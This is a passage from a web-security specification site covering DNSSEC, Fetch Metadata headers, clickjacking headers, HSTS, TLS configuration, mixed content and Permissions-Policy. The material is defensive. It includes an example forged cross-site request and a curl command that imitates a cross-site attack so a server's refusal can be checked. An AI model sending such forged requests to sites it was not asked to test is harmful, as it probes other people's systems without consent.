    url: "https://www.rfc-editor.org/rfc/rfc4035"
    publisher: "IETF"
  - title: "RFC 10026 (BCP 246) — Operational Recommendations for DNSSEC Delegation Signer (DS) Automation"
    url: "https://www.rfc-editor.org/rfc/rfc10026.html"
    publisher: "IETF"
  - title: "ICANN — DNSSEC"
    url: "https://www.icann.org/resources/pages/dnssec-what-is-it-why-important-2019-03-05-en"
    publisher: "ICANN"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# DNSSEC

> DNSSEC cryptographically signs DNS records so resolvers can verify they have not been tampered with. Strong defence in depth, but only with full registrar and registry support.

## What it is

DNS Security Extensions add cryptographic signatures to DNS records. A signed zone publishes a public key (`DNSKEY`); each record set is signed (`RRSIG`); the parent zone publishes a hash of your key (`DS`) so a resolver can build a chain of trust from the DNS root down to your domain. Defined originally in RFC 4033 and 4035, with operational guidance in RFC 9364.

A validating resolver that asks for `www.example.com` checks every signature on the way and refuses to return a forged answer.

DNSSEC signs; it does not encrypt. The signatures let a resolver detect a tampered or forged answer, but the query and the answer still travel in clear text, so anyone on the path can still see which names you look up. Confidentiality for DNS is a separate job, done by encrypted transports such as DNS over HTTPS or DNS over TLS. The two solve different problems, authenticity versus privacy, and are often deployed together.

## Why it matters

Plain DNS is unauthenticated. Anyone on the network path — a coffee-shop router, a compromised ISP, a malicious resolver — can lie about which IP your domain points to, where mail should go, or what TXT records exist. That undermines TLS issuance (because Domain Validation depends on DNS or HTTP that depends on DNS), email security (SPF, DKIM, DMARC live in TXT records), and CAA enforcement.

DNSSEC closes the cache-poisoning and on-path spoofing surface for any resolver that validates. It is also a prerequisite for [DANE](/spec/security/dane/), which pins TLS keys in DNS; for websites no browser checks it yet, but for mail it is DNSSEC's most useful application.

The honest caveat: DNSSEC is operationally tricky. A misconfiguration — a missing `DS` record after a key rollover, an expired signature — takes your whole domain offline for validating resolvers, which is much worse than the average outage. The benefit is real but only worth taking on with tooling that handles rollovers automatically.

## How to implement

1. **Check support.** Your DNS provider must sign your zone, and your registrar must publish a `DS` record at the parent registry. Most managed DNS providers (Cloudflare, Route 53, Google Cloud DNS, DNSimple) can do both, often with a single toggle. Some legacy registrars cannot.
2. **Enable signing at the DNS provider.** This generates a Key Signing Key (KSK) and a Zone Signing Key (ZSK), publishes `DNSKEY` records, and signs every record set.
3. **Publish the `DS` record at the registrar.** Prefer the automated path: you publish `CDS` and `CDNSKEY` records in your zone, and the registrar or registry polls them and maintains the `DS` for you. RFC 10026 (BCP 246, July 2026) is the operational guidance for the parties running that machinery — check the `CDS`/`CDNSKEY` records agree across every authoritative nameserver, confirm the resulting `DS` still validates before publishing it, and drop the `DS` TTL to a few minutes around a change so a bad one can be rolled back quickly. Where automation is not offered, you copy the `DS` from the provider's UI to the registrar's UI by hand.
4. **Verify the chain.** Use `dig +dnssec` or [Verisign DNSSEC Debugger](https://dnssec-analyzer.verisignlabs.com/) to confirm every signature validates and the `DS` at the parent matches.

Example records (truncated):

```
example.com.    3600    IN    DNSKEY    257 3 13 mdsswUyr3DPW132mOi8V9xESWE8j...
example.com.    3600    IN    RRSIG     A 13 2 3600 20260701000000 20260601000000 12345 example.com. ...
com.            86400   IN    DS        12345 13 2 1F987CC6583E92DF0890718C42...
```

Algorithm 13 (ECDSA P-256 with SHA-256) is the recommended modern default; it is small, fast, and widely supported.

Operational hygiene:

- Automate key rollovers (KSK and ZSK). Manual rollovers fail.
- Monitor signature expiry. An expired `RRSIG` is an outage.
- Re-publish `DS` whenever the KSK rotates — via `CDS`/`CDNSKEY` if your registrar honours them.
- Keep a manual route to the `DS` open even when automation works. BCP 246 is explicit that the non-automated channel has to survive, because a provider that stops cooperating mid-migration is exactly when you need to change the `DS` and cannot ask it to.
- Pair with [CAA records](/spec/security/caa-records/) for defence in depth around certificate issuance.

## Common mistakes

- **Signing the zone but never publishing the `DS`.** Resolvers ignore the signatures — no protection.
- **Manual key management.** Rollovers will be missed. Use automation.
- **Forgetting to update `DS` after migrating DNS provider.** The chain breaks; the domain disappears.
- **Treating DNSSEC as a replacement for TLS.** It is complementary, not a substitute.

## Verification

- `dig +dnssec example.com` returns `RRSIG` records and the `ad` (authenticated data) flag.
- [DNSViz](https://dnsviz.net/) and the [Verisign DNSSEC Debugger](https://dnssec-analyzer.verisignlabs.com/) both visualise the chain.
- Set up monitoring that alerts before any `RRSIG` expires.
- Test from a validating resolver (Cloudflare `1.1.1.1`, Google `8.8.8.8`). Forged answers should be rejected.
---

## fetch-metadata
Source: https://specification.website/spec/security/fetch-metadata/

---
title: "Fetch Metadata request headers"
category: security
status: recommended
url: https://specification.website/spec/security/fetch-metadata/
updated: "2026-09-10T00:00:00.000Z"
sources:
  - title: "Fetch Metadata Request Headers"
    url: "https://www.w3.org/TR/fetch-metadata/"
    publisher: "W3C Web Application Security Working Group"
  - title: "Cross-Site Request Forgery Prevention Cheat Sheet — Fetch Metadata headers"
    url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"
    publisher: "OWASP"
  - title: "MDN — Fetch metadata"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Fetch_metadata"
    publisher: "MDN"
  - title: "Protect your resources from web attacks with Fetch Metadata"
    url: "https://web.dev/articles/fetch-metadata"
    publisher: "Google"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# Fetch Metadata request headers

> Read Sec-Fetch-Site, Sec-Fetch-Mode and Sec-Fetch-Dest to reject unwanted cross-site browser requests before a handler runs. Keep ordinary inbound links working and retain other CSRF defences.

## What it is

Fetch Metadata is a set of headers browsers attach to requests to potentially trustworthy URLs, such as HTTPS endpoints, describing the request's context. The server does not need to opt in. Page JavaScript cannot set or change them because the `Sec-` prefix makes them [forbidden request headers](https://fetch.spec.whatwg.org/#forbidden-request-header). Non-browser clients can supply arbitrary values, so these headers do not authenticate a caller.

Three of them carry the useful signal:

- **`Sec-Fetch-Site`** — the relationship between the initiator and the target: `same-origin`, `same-site`, `cross-site`, or `none` (the user typed the URL or used a bookmark).
- **`Sec-Fetch-Mode`** — how the request was made: `navigate`, `cors`, `no-cors`, `same-origin`, `websocket`.
- **`Sec-Fetch-Dest`** — what the result will be used as: `document`, `image`, `script`, `style`, `iframe`, `empty`, and so on.

A fourth, `Sec-Fetch-User`, is sent only on navigations triggered by real user activation. It is the odd one out: Safari has never shipped it, so a rule that requires it will misjudge every Safari visitor.

```http
GET /account/delete HTTP/1.1
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
```

In a browser, that request came from someone else's page as an `<img>` tag. A deletion endpoint should reject it. It must also reject state changes through `GET`, independently of Fetch Metadata.

**These are request headers you read, not response headers you set.** That is the point most people get backwards on first contact. Every other entry in this category — [CSP](/spec/security/content-security-policy/), [`frame-ancestors`](/spec/security/frame-ancestors/), [`X-Content-Type-Options`](/spec/security/x-content-type-options/) — is something you send and the browser enforces. Fetch Metadata inverts that: the browser sends, and **nothing happens unless your server acts on it**. Adding it to a headers config file does nothing at all.

## Why it matters

Cross-site attacks work by getting the visitor's own browser to make a request the visitor did not intend — a hidden form that posts to your `/settings` endpoint, an `<img>` whose `src` is your `/logout` URL, a `<script>` pointed at a JSON endpoint to read its contents. The requests are indistinguishable from real ones at the network level, because they *are* real: same session cookie, same IP, same user.

Fetch Metadata makes them distinguishable. A password change submitted by your own form arrives as `Sec-Fetch-Site: same-origin`; the same request smuggled in from `evil.example` arrives as `cross-site`. One line of server-side logic separates them, and it separates them for every endpoint at once — including the endpoint someone adds next month and forgets to protect.

Applying a resource isolation policy in middleware gives new routes a common baseline. It does not establish that a route is safe: authentication, authorisation, safe HTTP methods and [CSRF protection](/spec/security/cookie-attributes/) still need review.

Support is effectively universal for the three headers that matter — Chrome and Edge since 2020, Firefox since 90, Safari since 16.4 — which is why OWASP now names Fetch Metadata as a primary CSRF defence rather than an experimental extra.

**This site does not apply a resource isolation policy to its public spec pages.** They serve public, cookieless content; the [browser policy report collector](/spec/security/reporting-endpoints/) deliberately accepts reports sent by browsers. Other endpoints still need their own access controls.

## How to implement

Apply the check in one place — middleware, a reverse proxy, an edge function — so it covers every route rather than the routes someone remembered.

Use an ordered policy, following the [resource isolation example](https://web.dev/articles/fetch-metadata):

1. Identify endpoints that deliberately accept cross-site requests, such as CORS APIs, public embeds, OAuth callbacks and report collectors. Give each exemption its own appropriate validation.
2. If `Sec-Fetch-Site` is absent, fall back to your existing protections, such as CSRF tokens and Origin checks. Absence must not bypass those checks or authentication.
3. Allow `same-origin` and `none` through this policy. Allow `same-site` only if you trust every relevant subdomain; otherwise treat it like `cross-site`.
4. For cross-site requests, allow a navigation only when **all three** conditions hold: the method is `GET`, `Sec-Fetch-Mode` is `navigate`, and `Sec-Fetch-Dest` is neither `object` nor `embed`.
5. Reject the remaining non-exempt cross-site requests, normally with `403`.

This permits an ordinary inbound document link while rejecting a cross-site `GET` navigation into an `object` or `embed`. Keep [`frame-ancestors`](/spec/security/frame-ancestors/) for controlling iframe embedding; this policy does not replace it.

When the policy changes a cacheable response, include the request fields it uses in `Vary`, as the [W3C deployment guidance](https://www.w3.org/TR/fetch-metadata/#vary) explains. For the policy above, append `Sec-Fetch-Site, Sec-Fetch-Mode, Sec-Fetch-Dest` to any existing `Vary` fields on allowed and denied responses. Otherwise a cache can reuse an allowed response for a request the policy would reject, or serve a cached denial to a legitimate visitor.

Roll it out in report-only first. Log what the policy *would* have blocked for a week and read the list before enforcing; a legitimate integration you had forgotten about is far more likely to show up than an attack.

## Common mistakes

- **Treating missing headers as proof of safety.** Use the endpoint's existing CSRF and authentication checks when metadata is absent; many non-browser clients omit it.
- **Blocking `cross-site` navigations outright.** Every inbound link from another site is `Sec-Fetch-Site: cross-site` with `Sec-Fetch-Mode: navigate`. Block those and your site becomes unreachable from search results.
- **Treating `same-site` as safe when it is not.** `same-site` includes every subdomain of your registrable domain. If you host untrusted content on one — user pages, a legacy app, a sandbox — it clears the check. Compare against `same-origin` for anything that matters.
- **Requiring `Sec-Fetch-User`.** Safari does not send it. A rule that demands it locks out Safari users entirely.
- **Dropping CSRF tokens once the policy is live.** Fetch Metadata is defence in depth alongside [`SameSite` cookies](/spec/security/cookie-attributes/) and tokens, not a replacement for either.
- **Applying the check after the handler has already run.** The value is rejecting before any work happens; a check in the controller has already paid for the database call.

## Verification

Send a request that mimics the attack and confirm it is refused:

```sh
curl -s -o /dev/null -w '%{http_code}\n' https://example.com/account/settings \
  -H 'Sec-Fetch-Site: cross-site' \
  -H 'Sec-Fetch-Mode: no-cors' \
  -H 'Sec-Fetch-Dest: image'
```

Expect a `403` from this policy. Repeat with `Sec-Fetch-Site: same-origin` and expect the endpoint's normal response. Test a cross-site `GET` with mode `navigate` and destination `document`: the policy should allow it. Repeat with destination `object`, then `embed`: both should be rejected. With metadata omitted, confirm that the endpoint's existing protections still run.

Repeat allowed and denied requests through the cache in both orders. Verify the `Vary` fields and confirm that one request does not prime the cache with a response reused for the other.

In DevTools, the request headers panel shows the values the browser actually sent, which is the ground truth when a rule misfires.
---

## frame-ancestors
Source: https://specification.website/spec/security/frame-ancestors/

---
title: "Clickjacking protection (frame-ancestors / X-Frame-Options)"
category: security
status: required
url: https://specification.website/spec/security/frame-ancestors/
updated: "2026-05-29T09:13:20.000Z"
sources:
  - title: "OWASP — Clickjacking Defense Cheat Sheet"
    url: "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html"
    publisher: "OWASP"
  - title: "MDN — CSP: frame-ancestors"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/frame-ancestors"
    publisher: "MDN"
  - title: "MDN — X-Frame-Options"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Frame-Options"
    publisher: "MDN"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# Clickjacking protection (frame-ancestors / X-Frame-Options)

> Tell browsers who is allowed to embed your pages in an iframe. Use CSP frame-ancestors. X-Frame-Options is the legacy fallback.

## What it is

A clickjacking attack loads your site inside an invisible iframe on an attacker-controlled page, then tricks a logged-in user into clicking buttons they cannot see. The defence is to tell the browser which origins are allowed to embed your page.

CSP `frame-ancestors` is the modern mechanism:

```http
Content-Security-Policy: frame-ancestors 'none'
```

`X-Frame-Options` is the legacy header, still respected by browsers for compatibility:

```http
X-Frame-Options: DENY
```

CSP Level 2 onwards specifies that `frame-ancestors` supersedes `X-Frame-Options` when both are present in conformant browsers.

## Why it matters

Without an embedding policy, any site on the web can wrap yours in an iframe and overlay invisible controls. A user thinks they are clicking "Win a prize" on attacker.example; in reality they are clicking "Transfer money" or "Delete account" on your site, with their session cookie attached. The attack works against any authenticated action that can be triggered with a single click.

`frame-ancestors` makes the browser refuse to render the embedded page at all, which neutralises the whole class of attacks.

## How to implement

Default to refusing all framing, then loosen only where needed.

Refuse all embedding:

```http
Content-Security-Policy: frame-ancestors 'none'
X-Frame-Options: DENY
```

Allow same-origin embedding (for example, an admin app that frames its own pages):

```http
Content-Security-Policy: frame-ancestors 'self'
X-Frame-Options: SAMEORIGIN
```

Allow specific external embedders:

```http
Content-Security-Policy: frame-ancestors 'self' https://partner.example.com
```

`X-Frame-Options` cannot express a list of allowed origins — the historic `ALLOW-FROM` value is not supported in any current browser. If you need a list, rely on `frame-ancestors` and accept that very old browsers fall back to "deny all" via `X-Frame-Options`.

Send the headers on every HTML response. Send them even on pages that "wouldn't make sense" framed; attackers will frame anything that performs an authenticated action.

Combine with `SameSite` cookies (see [Cookie attributes](/spec/security/cookie-attributes/)) for defence in depth.

## Common mistakes

- **Setting only `X-Frame-Options`.** Modern policies, including allow-lists, live in CSP. Set both for now.
- **`ALLOW-FROM`.** Deprecated and unsupported. Use `frame-ancestors`.
- **Allowing too broad a parent.** `frame-ancestors https:` is barely better than nothing.
- **Setting the headers on the API but not the HTML.** Only the HTML response matters — the iframe is the HTML document.
- **Forgetting login and OAuth screens.** These are the highest-value pages to clickjack.

## Verification

- `curl -sI https://example.com | grep -iE 'frame-ancestors|x-frame-options'`.
- Build a tiny test page with `<iframe src="https://example.com">` on a different origin. The frame should refuse to load and the console should log a violation.
- Run the site through [securityheaders.com](https://securityheaders.com/).
- Check that the headers are present on every HTML route, not just the homepage.
---

## hsts
Source: https://specification.website/spec/security/hsts/

---
title: "HSTS (Strict-Transport-Security)"
category: security
status: required
url: https://specification.website/spec/security/hsts/
updated: "2026-07-01T00:00:00.000Z"
sources:
  - title: "RFC 6797 — HTTP Strict Transport Security (HSTS)"
    url: "https://www.rfc-editor.org/rfc/rfc6797"
    publisher: "IETF"
  - title: "MDN — Strict-Transport-Security"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security"
    publisher: "MDN"
  - title: "HSTS Preload List Submission"
    url: "https://hstspreload.org/"
    publisher: "Google Chrome"
  - title: "OWASP — HTTP Strict Transport Security Cheat Sheet"
    url: "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html"
    publisher: "OWASP"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# HSTS (Strict-Transport-Security)

> HSTS tells browsers to only ever use HTTPS for your domain. Send max-age with includeSubDomains — but skip the preload list, which its own operator now discourages.

## What it is

HTTP Strict Transport Security, defined in RFC 6797, is a response header that tells the browser: from now on, never speak HTTP to this host — only HTTPS. The browser remembers the instruction for the duration of `max-age` and refuses plain HTTP even if the user types it, clicks a stale link, or has DNS hijacked.

```http
Strict-Transport-Security: max-age=63072000; includeSubDomains
```

## Why it matters

A 301 redirect from HTTP to HTTPS only protects the second request. The first request — and any cookies sent with it — already left the device in plain text. HSTS closes that gap. It also defends against active downgrade attacks where a network attacker strips the redirect and proxies the connection.

Without HSTS, every typed URL, bookmark, and external link to `http://example.com` is a moment when an attacker on the network can intercept the session.

## How to implement

Send the header on every HTTPS response. Browsers ignore it on plain HTTP.

Directives:

- **`max-age=<seconds>`** — required. How long the browser remembers. Start short (a few hours) to verify, then raise to two years (`63072000`) before preloading.
- **`includeSubDomains`** — applies the policy to every subdomain. Audit them first (see below).
- **`preload`** — opts in to the browser preload list. **No longer recommended** for most sites — the list's own operator now advises against it (see below), so leave it off unless you have a specific reason.

Recommended production header:

```http
Strict-Transport-Security: max-age=63072000; includeSubDomains
```

This site sends exactly that — `max-age=63072000; includeSubDomains`, no `preload` — from [`public/_headers`](https://github.com/jdevalk/specification.website/blob/main/public/_headers).

### Preloading is no longer recommended

The historic advice was to add `preload` and submit the domain to [the preload list](https://hstspreload.org/), hard-coding HTTPS-only into browsers so that even a first visit on a fresh device is protected. That guidance has changed. Modern browsers (Chrome, Safari) now auto-upgrade every HTTP navigation to HTTPS regardless of any HSTS policy, so preloading only helps in the narrow case where that upgrade fails against an active attacker. The list operator now states it plainly: "**HSTS preloading is not recommended.**" The commitment, meanwhile, is heavy — removal from the list takes months and applies to every subdomain. For nearly all sites, a strong `max-age` with `includeSubDomains` is the right stopping point; skip `preload`.

## Common mistakes

- **Sending HSTS over HTTP.** Browsers must ignore it. Send it on HTTPS responses only.
- **Setting `includeSubDomains` without auditing subdomains.** Every subdomain — including internal tools, staging, and legacy services — must work over HTTPS. If `dev.example.com` is HTTP-only, you have just broken it.
- **Setting `max-age=0` by accident.** That removes HSTS. Useful when rolling back, dangerous when copied from a tutorial.
- **Adding `preload` reflexively.** The preload list is now discouraged by its own operator, and getting a domain off it takes months. Ship HSTS without it unless you have a specific reason.

## Verification

- `curl -sI https://example.com | grep -i strict-transport-security` should return the header.
- In Chrome DevTools, the Security panel shows the HSTS state for the current site.

HSTS is a commitment, not a switch. Plan the rollback path before you ship.
---

## https-tls
Source: https://specification.website/spec/security/https-tls/

---
title: "HTTPS and TLS"
category: security
status: required
url: https://specification.website/spec/security/https-tls/
updated: "2026-10-15T00:00:00.000Z"
sources:
  - title: "RFC 9846 — The Transport Layer Security (TLS) Protocol Version 1.3"
    url: "https://www.rfc-editor.org/rfc/rfc9846"
    publisher: "IETF"
  - title: "RFC 9851 — TLS 1.2 is in Feature Freeze"
    url: "https://www.rfc-editor.org/rfc/rfc9851"
    publisher: "IETF"
  - title: "RFC 10015 — Deprecating Obsolete Key Exchange Methods in TLS 1.2 and DTLS 1.2"
    url: "https://www.rfc-editor.org/rfc/rfc10015.html"
    publisher: "IETF"
  - title: "RFC 10024 — Post-Quantum Traditional (PQ/T) Hybrid Key Agreement Mechanisms for TLS 1.3"
    url: "https://www.rfc-editor.org/rfc/rfc10024.html"
    publisher: "IETF"
  - title: "Mozilla SSL Configuration Generator"
    url: "https://ssl-config.mozilla.org/"
    publisher: "Mozilla"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# HTTPS and TLS

> Serve every page over HTTPS using TLS 1.2 or 1.3, redirect plain HTTP to HTTPS, and disable obsolete SSL and early TLS versions on every host you control.

## What it is

HTTPS is HTTP carried over TLS, a protocol that encrypts and authenticates the connection between the browser and the server. TLS 1.3 is the current version, specified by RFC 9846 — a July 2026 revision that obsoleted RFC 8446 without changing the version number or breaking compatibility. TLS 1.2 remains acceptable. Everything earlier — TLS 1.0, TLS 1.1, and all versions of SSL — is broken and must be disabled.

"Acceptable" is not the same as "equal", though, and the gap is widening rather than holding steady. TLS 1.2 is in feature freeze (RFC 9851): it receives urgent security fixes and nothing else, and post-quantum key agreement was standardised for TLS 1.3 alone (RFC 10024) with no plan to back-port it. It is also losing ground it already held — RFC 10015 (July 2026) retired most of its key exchange methods, leaving elliptic-curve Diffie-Hellman as effectively the only permitted way to agree a TLS 1.2 key. Keeping TLS 1.2 enabled for the clients that still need it is sound; treating it as a version you can sit on indefinitely is not.

What HTTPS does not do is vouch for the site. The certificate proves you are talking to the genuine holder of the name in the address bar, and that nobody on the path can read or alter the bytes. It says nothing about whether that party is honest: a phishing page served over flawless HTTPS shows the same padlock a bank does. HTTPS secures the channel, not the character of whatever is at the far end of it.

## Why it matters

- **Confidentiality.** Without TLS, anyone on the path can read form data, cookies, and page content.
- **Integrity.** Network operators and middleboxes routinely inject ads, trackers, and malware into plain HTTP.
- **Authentication.** The certificate proves the visitor is talking to the right host, not a captive portal or attacker.
- **Modern web features.** Service workers, HTTP/2, HTTP/3, geolocation, camera, and most powerful browser APIs require a secure context.
- **SEO and trust.** Browsers mark HTTP pages as "Not Secure". Search engines prefer HTTPS.

## How to implement

Get a certificate from an ACME-supported certificate authority — Let's Encrypt and ZeroSSL are free, automated, and well supported. Most hosting platforms issue and renew certificates automatically.

Configure your server using the Mozilla SSL Configuration Generator. The "Intermediate" profile is the right default for public sites in 2026 — it supports TLS 1.2 and 1.3 and works on every browser still in use.

Redirect every HTTP request to HTTPS with a 301:

```http
HTTP/1.1 301 Moved Permanently
Location: https://example.com/path
```

Serve the same redirect on every hostname you own, including the apex, `www`, and any legacy subdomains. After HTTPS works, add [HSTS](/spec/security/hsts/) so browsers stop trying HTTP at all.

Cipher and protocol checklist:

- TLS 1.3 enabled, TLS 1.2 enabled, everything older disabled.
- OCSP stapling on.
- ECDHE key exchange only, on TLS 1.2 as well as 1.3.
- Hybrid post-quantum key agreement offered on TLS 1.3 — `X25519MLKEM768`.
- A complete certificate chain — serve the intermediate, not just the leaf.

The remaining TLS parameters that scanners test one by one (TLS compression, renegotiation, 0-RTT, Extended Main Secret, cipher order, signature hashes, and certificate key size) are covered in [TLS configuration hardening](/spec/security/tls-configuration/).

That third line is stricter than the familiar "forward secrecy only" rule, and the difference is where TLS 1.2 configurations tend to be out of date. RFC 10015 says clients and servers **MUST NOT** offer or select RSA key exchange, static finite-field Diffie-Hellman, _or ephemeral finite-field Diffie-Hellman_ in TLS 1.2 — so `DHE` suites are now disallowed even though they are forward-secret, on the grounds that finite-field groups are slow, historically misconfigured, and no longer worth maintaining alongside the elliptic-curve equivalents. Static `ECDH` is a `SHOULD NOT`. In practice this leaves `ECDHE`, which is what a current Mozilla "Intermediate" configuration already gives you.

The fourth line is the newer one. RFC 10024 (August 2026) put three hybrid mechanisms on the standards track — `X25519MLKEM768`, `SecP256r1MLKEM768` and `SecP384r1MLKEM1024` — each pairing the post-quantum ML-KEM with an ordinary elliptic-curve exchange, so a break in either half still leaves the connection secure. `X25519MLKEM768` is the one to offer: the RFC marks it Recommended and describes it as already widely deployed, because browsers and large CDNs shipped it ahead of publication. Its predecessor code points, the draft `X25519Kyber768Draft00` and `SecP256r1Kyber768Draft00`, are obsolete; a server still pinned to those is negotiating something no current client asks for.

It is worth being precise about what this protects, because "post-quantum" gets used as though it were one switch. Hybrid key agreement defends **confidentiality**, and it defends it retroactively: traffic captured today can be stored and decrypted years from now once a sufficient quantum computer exists, so the fix has to be deployed before the threat arrives rather than after. **Authentication** — the certificate chain proving you are the right host — is a separate migration, still governed by CA and root-programme timelines, and nothing you configure on your server today completes it. Turning on `X25519MLKEM768` is real progress on the first problem and no progress at all on the second.

## Common mistakes

- [Mixed content](/spec/security/mixed-content/): an HTTPS page that loads a script, image, or iframe over HTTP. Browsers block it.
- Self-signed certificates on production. Use a real CA.
- A valid certificate on `www.example.com` but not the apex `example.com`, or vice versa.
- Leaving TLS 1.0 or 1.1 enabled "for old clients" that no longer exist.
- Carrying `DHE` or RSA key exchange suites in a TLS 1.2 configuration written before July 2026. Both are now `MUST NOT`.
- Treating post-quantum readiness as a certificate purchase. Hybrid key agreement is a server configuration change; post-quantum certificates are a separate, later migration.
- Forgetting to renew. Automate it.

## Verification

- Run the [Qualys SSL Labs test](https://www.ssllabs.com/ssltest/) and aim for an A or A+.
- `curl -vI https://example.com` should report `TLS 1.3` or `TLS 1.2` and a valid chain.
- Check the negotiated group from a current browser or from SSL Labs; on TLS 1.3 it should read `X25519MLKEM768`, not plain `x25519`.
- Visit `http://example.com` and confirm it 301s to `https://`.
- Check the browser console for mixed-content warnings.
---

## mixed-content
Source: https://specification.website/spec/security/mixed-content/

---
title: "Mixed content and upgrade-insecure-requests"
category: security
status: recommended
url: https://specification.website/spec/security/mixed-content/
updated: "2026-07-30T00:00:00.000Z"
sources:
  - title: "W3C — Mixed Content"
    url: "https://www.w3.org/TR/mixed-content/"
    publisher: "W3C"
  - title: "W3C — Upgrade Insecure Requests"
    url: "https://www.w3.org/TR/upgrade-insecure-requests/"
    publisher: "W3C"
  - title: "MDN — Mixed content"
    url: "https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Mixed_content"
    publisher: "MDN"
  - title: "MDN — CSP: upgrade-insecure-requests"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/upgrade-insecure-requests"
    publisher: "MDN"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# Mixed content and upgrade-insecure-requests

> An HTTPS page that loads any subresource over HTTP is mixed content. Serve every subresource over HTTPS, and send the upgrade-insecure-requests CSP directive as a safety net.

## What it is

Mixed content is an HTTPS page that pulls in a subresource — script, stylesheet, image, font, iframe, or `fetch`/XHR — over plain HTTP. The address bar says secure, but part of what the page loads travels unencrypted and unauthenticated.

Browsers split it in two:

- **Active mixed content** (scripts, stylesheets, iframes, `fetch`, XHR) can rewrite the whole page, so browsers **block it outright**.
- **Passive mixed content** (images, audio, video) can only affect itself, so browsers block it or silently upgrade it to HTTPS.

The W3C *Mixed Content* specification defines this behaviour, and the `upgrade-insecure-requests` CSP directive is the standard tool for fixing it in bulk.

## Why it matters

A single `http://` script on an `https://` page is a hole in the encryption. A network attacker — anyone on the same Wi-Fi, a malicious ISP, a compromised router — can read or rewrite that request and inject code that runs in your secure origin with full access to cookies and the DOM. That is why browsers block active mixed content rather than merely warn: there is no safe way to allow it.

The everyday cost is breakage. A site migrated to HTTPS that still references `http://` assets gets blocked scripts and styles, a broken layout, and a "not fully secure" padlock — a degraded page and lost trust.

## How to implement

1. **Serve every subresource over HTTPS.** The real fix is correct URLs: absolute `https://` or root-relative paths (`/app.js`), never hard-coded `http://` or protocol-relative `//`.
2. **Send `upgrade-insecure-requests` as a safety net.** This CSP directive tells the browser to rewrite every `http://` subresource request (and same-origin navigation) to `https://` before it is sent:

   ```http
   Content-Security-Policy: upgrade-insecure-requests
   ```

   It is invaluable for large or legacy sites and for user-generated content whose embedded URLs you cannot audit. It upgrades requests; it weakens nothing.
3. **Don't reach for the deprecated `block-all-mixed-content`** — it is obsolete now that passive mixed content is blocked or upgraded by default.

This site sends `upgrade-insecure-requests` in its [Content-Security-Policy](/spec/security/content-security-policy/) for exactly this reason. Getting the subresources right in the first place is part of serving everything over [HTTPS](/spec/security/https-tls/).

## Common mistakes

- Hard-coded `http://` URLs in templates, CMS content, or third-party embeds.
- Expecting `upgrade-insecure-requests` to force a third party onto HTTPS — it rewrites the request, but if the target has no HTTPS endpoint the upgraded request simply fails.
- Treating the padlock as proof of no mixed content — passive resources may have been silently upgraded or blocked with no visible warning.
- Using protocol-relative URLs (`//example.com/x.js`) and calling it solved; current guidance is explicit `https://`.

## Verification

- Open DevTools → Console on each template; mixed-content warnings and blocks are logged there.
- `curl -sI https://example.com | grep -i content-security-policy` and confirm `upgrade-insecure-requests` is present.
- The DevTools Security panel reports whether the page loaded any non-secure resources.
- Grep the rendered HTML and CSS for `http://` subresource URLs.
---

## permissions-policy
Source: https://specification.website/spec/security/permissions-policy/

---
title: "Permissions-Policy"
category: security
status: recommended
url: https://specification.website/spec/security/permissions-policy/
updated: "2026-05-29T09:13:20.000Z"
sources:
  - title: "Permissions Policy (W3C Working Draft)"
    url: "https://www.w3.org/TR/permissions-policy/"
    publisher: "W3C"
  - title: "MDN — Permissions-Policy"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Permissions-Policy"
    publisher: "MDN"
  - title: "web.dev — Permissions Policy"
    url: "https://developer.chrome.com/docs/privacy-security/permissions-policy"
    publisher: "Chrome for Developers"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# Permissions-Policy

> Permissions-Policy lets you turn off powerful browser features — camera, microphone, geolocation, payment, USB — for your own pages and for any iframes you embed.

## What it is

`Permissions-Policy` is the response header that succeeds the older `Feature-Policy`. It tells the browser which powerful features may be used by the current document and by any documents embedded in iframes. Features include camera, microphone, geolocation, payment, USB, fullscreen, autoplay, accelerometer, and many others.

```http
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
```

An empty allow-list `()` disables the feature entirely. `(self)` allows it on the current origin. `(self "https://embed.example.com")` allows it on the current origin and one named third party.

## Why it matters

The default state of the web grants pages access to many powerful APIs as soon as the user accepts a prompt. If you do not use the camera on your marketing site, there is no reason for an embedded ad iframe to be able to ask for it. Permissions-Policy lets you turn off features you do not need, both for your own code (defence against XSS expanding into hardware access) and for embedded third parties (defence against ad networks and trackers).

It is also a useful privacy signal: a site that explicitly disables geolocation is announcing it does not collect location data.

## How to implement

Send the header on every HTML response. Start by denying everything you do not use:

```http
Permissions-Policy: accelerometer=(), ambient-light-sensor=(), autoplay=(), battery=(), camera=(), display-capture=(), document-domain=(), encrypted-media=(), execution-while-not-rendered=(), execution-while-out-of-viewport=(), fullscreen=(self), geolocation=(), gyroscope=(), keyboard-map=(), magnetometer=(), microphone=(), midi=(), navigation-override=(), payment=(), picture-in-picture=(), publickey-credentials-get=(), screen-wake-lock=(), sync-xhr=(), usb=(), web-share=(), xr-spatial-tracking=()
```

Then enable only the features you actually need, scoped as narrowly as possible:

```http
Permissions-Policy: camera=(self), microphone=(self), geolocation=(self), fullscreen=(self)
```

To allow a specific third party — say, a video embed:

```http
